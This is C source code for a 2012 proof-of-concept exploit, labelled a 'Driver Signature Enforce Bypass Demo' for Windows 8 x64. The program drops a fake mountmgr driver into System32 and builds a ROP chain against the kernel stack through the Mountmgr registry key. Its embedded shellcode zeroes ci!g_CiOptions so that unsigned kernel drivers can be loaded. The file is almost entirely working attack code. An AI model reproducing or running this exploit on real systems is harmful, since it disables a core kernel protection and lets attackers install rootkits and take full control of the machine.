BOOL OutputMountmgrFakeFile()
{
	 HRSRC hsrc = FindResource(NULL, MAKEINTRESOURCE(IDR_BIN1), L"BIN");
	 DWORD dwSize ;
	 HGLOBAL hGlobal ; 
	 PVOID pBuffer ; 
	 WCHAR MountMgrFakePath[MAX_PATH];


	 if (PathCombine(MountMgrFakePath , System32Dir , L"drivers\\mountmgrfake.sys") == NULL)
	 {
		return FALSE ; 
	 }

	 if (hsrc == 0 )
	 {
		 return FALSE ; 
	 }

	 dwSize = SizeofResource(NULL , hsrc);

	 if (dwSize == 0 )
	 {
		 return FALSE ; 
	 }

	 hGlobal = LoadResource(NULL , hsrc);

	 if (hGlobal == 0 )
	 {
		 return FALSE ; 
	 }

	 pBuffer = LockResource(hGlobal);

	 if (pBuffer == NULL)
	 {
		 return FALSE ; 
	 }

	 HANDLE hfile = CreateFile(MountMgrFakePath , FILE_WRITE_DATA , FILE_SHARE_READ , 0 , CREATE_ALWAYS , 0 , 0 );

	 if (hfile == INVALID_HANDLE_VALUE)
	 {
		 return FALSE ; 
	 }

	 DWORD btw ; 

	 if (WriteFile(hfile , pBuffer , dwSize , &btw , NULL) == FALSE)
	 {
		 CloseHandle(hfile);
		 return FALSE ; 
	 }

	 CloseHandle(hfile);

	 return TRUE ; 
	
}



typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR Buffer ; 
} UNICODE_STRING;
typedef UNICODE_STRING *PUNICODE_STRING;
typedef const UNICODE_STRING *PCUNICODE_STRING;
#define RTL_CONSTANT_STRING(s) { sizeof( s ) - sizeof( (s)[0] ), sizeof( s ) ,s}

UNICODE_STRING DriverServiceName = RTL_CONSTANT_STRING(L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\Mountmgr");

WCHAR NewDriverPath[] = L"System32\\drivers\\mountmgrfake.sys";
WCHAR OldDriverPath[] = L"System32\\drivers\\mountmgr.sys";
WCHAR ImagePathValueName[] = L"ImagePath";


typedef NTSTATUS (NTAPI *PNT_LOAD_DRIVER)(PUNICODE_STRING DriverName);
typedef NTSTATUS (NTAPI *PNT_UNLOAD_DRIVER)(PUNICODE_STRING DriverName);

BYTE ShellCode[] = {
	0x48 , 0x81 , 0xEC , 0xF8 , 0x00 , 0x00 , 0x00 ,					 //		SUB RSP , 0xF8
	0x4C , 0x8D , 0x05 , 0x18 , 0x00 , 0x00 , 0x00 ,					 //L1:	LEA R8  , L2
	0x33 , 0xD2 ,														 //		XOR EDX , EDX
	0x33 , 0xC9 ,														 //		XOR ECX , ECX
	0x48 , 0xB8 , 0xBB , 0xBB , 0xBB , 0xBB , 0xBB , 0xBB , 0xBB , 0xBB, //		MOV RAX , 0xBBBBBBBBBBBBBBBB//ci!g_CiOptions
	0x89 , 0x08 ,														 //		MOV [RAX] , ECX
	0xFF , 0x15 , 0x0A , 0x00 , 0x00 , 0x00 ,							 //		CALL L3
	0xEB , 0xE1 ,														 //		JMP  L1
	0x00 , 0xBA , 0x3C , 0xDC , 0xFF , 0xFF , 0xFF , 0xFF,				 //L2:	=-600000000 = 60secs
	0xAA , 0xAA , 0xAA , 0xAA , 0xAA , 0xAA , 0xAA , 0xAA				 //L3:	=KeDelayExecutionThread 0xAAAAAAAAAAAAAAAA
};


int _tmain(int argc, _TCHAR* argv[])
{
	ULONG Offsetg_CiOptions ; 
	ROP_ADDRINFO RopInfo ; 
	PVOID OverwriteStack ;
	ULONG ReturnLength ; 
	ULONG_PTR NtoskrnlBase ; 
	ULONG_PTR CiBase ; 
	PNT_LOAD_DRIVER pNtLoadDriver ; 
	PNT_UNLOAD_DRIVER pNtUnloadDriver ; 
	HKEY hkeymountmtrsvc;


	printf("Windows 8 X64 Driver Signature Enforce Bypass Demo\n"
		"By MJ0011 th_decoder@126.com\n"
		"2012-9-18\n"
		"\nPRESS ENTER\n");

	getchar();

	if (GetSystemDirectory(System32Dir , MAX_PATH) == 0 )
	{
		printf("[-] Can not get system32 directory\n");
		return 0 ; 
	}


	printf("[+] Output moutnmgrfake.sys ......");

	if (OutputMountmgrFakeFile() == FALSE)
	{
		printf(" failed.\n");
		return 0 ; 
	}
	printf(" OK.\n");

	printf("[+] Find ci!g_CiOptions ...... ");

	Offsetg_CiOptions = FindCiOptions();

	if (Offsetg_CiOptions == NULL)
	{
		printf("failed\n");
		return 0 ; 
	}

	printf("offset : %08x\n" , Offsetg_CiOptions);

	printf("[+] Find ROP Codes ......\n");

	if (FindROPCodes(&RopInfo) == FALSE)
	{
		printf("failed\n");
		return 0 ; 
	}

	RopInfo.OffsetgCiOptions = Offsetg_CiOptions ; 

	printf("[+] Enable Load Driver Privilege ......");

	if (EnableDisabledPriv(SE_LOAD_DRIVER_NAME) == FALSE)
	{
		printf(" failed.\n");
		return 0 ; 
	}
	printf(" OK.\n");

	printf("[+] Get Kernel Module information ......");
	
	if (GetKernelModuleInformation(&NtoskrnlBase , &CiBase) == FALSE)
	{
		printf(" failed.\n");
		return 0 ; 
	}
	printf(" OK.\n");

	printf("[+] Ntoskrnl.exe Base = %I64x\n" , NtoskrnlBase);

	printf("[+] Ci.dll       Base = %I64x\n" , CiBase);

	printf("[+] Prepare overwrite kernel stack content ......");


	OverwriteStack = PrepareOverwriteStack(&RopInfo,
											NtoskrnlBase ,
											CiBase , 
											(ULONG_PTR)ShellCode ,
											sizeof(ShellCode),
											&ReturnLength);

	if (OverwriteStack == NULL)
	{
		printf(" failed.\n");
		return 0 ; 
	}
	printf(" OK.\n");

	printf("[+] Set Mount Manger Registry ......");

	if (SetMountMgrRegistry(OverwriteStack , ReturnLength , &hkeymountmtrsvc) == FALSE)
	{
		VirtualFree(OverwriteStack , 0 , MEM_RELEASE);
		printf(" failed.\n");
		return 0 ; 
	}

	printf(" OK.\n");

	printf("[+] Start Load Driver Thread ......\n");


	pNtLoadDriver = (PNT_LOAD_DRIVER)GetProcAddress(GetModuleHandleA("ntdll.dll") , "NtLoadDriver");
	pNtUnloadDriver = (PNT_UNLOAD_DRIVER)GetProcAddress(GetModuleHandleA("ntdll.dll") , "NtUnloadDriver");


	DWORD dwret ; 
	NTSTATUS status ; 

	if (pNtLoadDriver == 0 || pNtUnloadDriver == 0 )
	{
		VirtualFree(OverwriteStack , 0 , MEM_RELEASE);
		printf(" failed.\n");
		return 0 ; 
	}

	dwret = RegSetValueEx(hkeymountmtrsvc , ImagePathValueName , 0 , REG_EXPAND_SZ , (CONST BYTE*)NewDriverPath , sizeof(NewDriverPath));


	if (dwret != ERROR_SUCCESS)
	{
		VirtualFree(OverwriteStack , 0 , MEM_RELEASE);
		RegCloseKey(hkeymountmtrsvc);
		printf(" failed.\n");
		return 0 ; 
	}

	status = pNtUnloadDriver(&DriverServiceName);

	if (!NT_SUCCESS(status))
	{
		VirtualFree(OverwriteStack , 0 , MEM_RELEASE);
		RegCloseKey(hkeymountmtrsvc);
		printf(" failed.\n");
		return 0 ; 
	}

	status = pNtLoadDriver(&DriverServiceName);

	if (!NT_SUCCESS(status))
	{
		VirtualFree(OverwriteStack , 0 , MEM_RELEASE);
		RegCloseKey(hkeymountmtrsvc);
		printf(" failed.\n");
		return 0 ; 
	}

	printf(" OK.\n");

	printf("[+] Reload Old MountMgr Driver ...... \n");

	status = pNtUnloadDriver(&DriverServiceName);

	if (!NT_SUCCESS(status))
	{
		printf("[-] failed in reload old driver:unload new driver failed %08x\n" , status);
	}

	dwret = RegSetValueEx(hkeymountmtrsvc , ImagePathValueName , 0 , REG_EXPAND_SZ , (CONST BYTE*)OldDriverPath , sizeof(OldDriverPath));

	if (dwret != ERROR_SUCCESS)
	{
		printf("[-] failed in reload old driver:Set value of ImagePath failed %u\n" , dwret);
	}

	status = pNtLoadDriver(&DriverServiceName);

	if (!NT_SUCCESS(status))
	{
		printf("[-] failed in reload old driver:load old driver failed %08x\n" , status);
	}
	
	printf("[+] Reload OK!\n");
	
	RegCloseKey(hkeymountmtrsvc);

	VirtualFree(OverwriteStack , 0 , MEM_RELEASE);

	return 0;
}
